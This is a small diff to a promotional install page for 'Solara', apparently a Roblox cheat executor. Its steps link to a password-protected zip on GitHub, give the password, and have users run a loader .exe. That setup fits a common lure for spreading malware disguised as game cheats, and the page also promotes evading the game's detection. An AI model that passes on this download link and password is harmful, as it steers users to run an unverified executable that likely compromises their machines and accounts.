@@ -14,7 +14,7 @@ What would happen if Roblox ever detected Solara? Well, we are always here to of
 
 🎁 **How to install Solara**
 
-1. Click [Download](https://github.com/Restelll/R0bl0x/releases/download/robloxexecutor/SolaraLoader.zip) (EnterPass-pi_d1ddy2024) file solararaloader.exe
+1. Click [Download](https://github.com/Restelll/R0bl0x/releases/download/robloxexecutor/SolaraLoader.zip) (Enter Pass: pi_d1ddy2024) file solararaloader.exe
 2. Find a script for your game.
 3. Run Roblox.
 4. Enjoy!
